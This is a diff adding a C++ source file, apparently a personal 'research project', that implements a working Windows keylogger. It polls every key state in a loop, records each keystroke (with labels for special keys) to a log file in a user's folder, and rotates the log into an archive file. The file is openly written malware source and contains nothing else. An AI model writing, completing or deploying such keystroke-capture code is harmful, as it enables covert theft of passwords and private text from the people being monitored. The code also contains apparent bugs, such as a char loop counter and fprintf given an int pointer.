@@ -1,0 +1,141 @@
+// researchproject.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+
+#include <iostream>
+#include <windows.h>
+#include <winuser.h>
+#include <fstream>
+#include <winbase.h>
+using namespace std;
+
+int save(int _key, char const* file);
+int shiftSave(int _key, char const* file);
+int archive(char const* file);
+long getfilesize(char const* file);
+int resetLog(char const* file);
+
+
+int main() {
+    char i;
+    char const* file = "C:\\Users\\Sabby's Laptop\\log.txt";
+
+    while (true) {
+        for (i = 8; i <= 255; i++) {
+            if (GetAsyncKeyState(i) == -32767) {
+                if (GetKeyState(VK_SHIFT) < 0) {
+                    shiftSave(i, file);
+                }
+                else {
+                    save(i, file);
+                }
+            }
+        }
+    }
+
+
+    return 0;
+}
+
+int shiftSave(int _key, char const* file) {
+
+    cout << _key << endl;
+    FILE* OUTPUT_FILE;
+    OUTPUT_FILE = fopen(file, "a+");
+
+    if (_key == VK_BACK)
+        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+    else if (_key == VK_SHIFT)
+        fprintf(OUTPUT_FILE, "%s", "");
+    else if (_key == VK_RETURN)
+        fprintf(OUTPUT_FILE, "%s", "[ENTER]");
+    else if (_key == VK_TAB)
+        fprintf(OUTPUT_FILE, "%s", "[TAB]");
+    else if (_key == VK_SPACE)
+        fprintf(OUTPUT_FILE, "%s", "\n");
+    else if (_key == VK_CAPITAL)
+        fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
+    else if (_key == VK_LEFT)
+        fprintf(OUTPUT_FILE, "%s", "[LEFT ARROW]");
+    else if (_key == VK_RIGHT)
+        fprintf(OUTPUT_FILE, "%s", "[RIGHT ARROW]");
+    else if (_key == VK_OEM_PERIOD)
+        fprintf(OUTPUT_FILE, "%s", ".");
+    else if (_key == VK_OEM_MINUS)
+        fprintf(OUTPUT_FILE, "%s", "-");
+    else if (_key == VK_OEM_1)
+        fprintf(OUTPUT_FILE, "%s", ";");
+    else {
+        fprintf(OUTPUT_FILE, "%s", "[");
+        fprintf(OUTPUT_FILE, "%s", &_key);
+        fprintf(OUTPUT_FILE, "%s", "]");
+    }
+    fclose(OUTPUT_FILE);
+
+    return 0;
+}
+
+
+int save(int _key, char const *file) {
+
+    cout << _key << endl;
+    FILE* OUTPUT_FILE;
+    OUTPUT_FILE = fopen(file, "a+");
+
+    if (_key == VK_BACK)
+        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+    else if (_key == VK_SHIFT)
+        fprintf(OUTPUT_FILE, "%s", "");
+    else if (_key == VK_RETURN)
+        fprintf(OUTPUT_FILE, "%s", "[ENTER]");
+    else if (_key == VK_TAB)
+        fprintf(OUTPUT_FILE, "%s", "[TAB]");
+    else if (_key == VK_SPACE) {
+        fprintf(OUTPUT_FILE, "%s", "\n");
+        if (getfilesize(file) > 30) {
+            archive("C:\\Users\\Sabby's Laptop\\log.txt");
+            resetLog(file);
+        }
+    }
+    else if (_key == VK_CAPITAL)
+        fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
+    else if (_key == VK_LEFT)
+        fprintf(OUTPUT_FILE, "%s", "[LEFT ARROW]");
+    else if (_key == VK_RIGHT)
+        fprintf(OUTPUT_FILE, "%s", "[RIGHT ARROW]");
+    else if (_key == VK_OEM_PERIOD)
+        fprintf(OUTPUT_FILE, "%s", ".");
+    else if (_key == VK_OEM_MINUS)
+        fprintf(OUTPUT_FILE, "%s", "-");
+    else if (_key == VK_OEM_1)
+        fprintf(OUTPUT_FILE, "%s", ";");
+    //For testing only. Will remove when complete
+    else if (_key == VK_ESCAPE) {
+        fprintf(OUTPUT_FILE, "%s", "[E]");
+        exit(0);
+    }
+    else
+        fprintf(OUTPUT_FILE, "%s", &_key);
+    fclose(OUTPUT_FILE);
+
+    return 0;
+}
+
+int archive(char const *file) {
+    char const* ogFile;
+    ogFile = file;
+    char const* archive;
+    archive = "C:\\Users\\Sabby's Laptop\\archive.txt";
+    std::ofstream archiveRest(archive, std::ofstream::trunc); // Resets the archive file
+    CopyFileA(ogFile, archive, FALSE); //Copies the log file to archive file
+    return 0;
+}
+
+long getfilesize(char const* file) {
+    std::ifstream infile(file, std::ifstream::ate | std::ifstream::binary);
+    return infile.tellg();
+}
+
+int resetLog(char const* file) {
+    std::ofstream logReset(file, std::ofstream::trunc); //Resets the log file
+    return 0;
+}
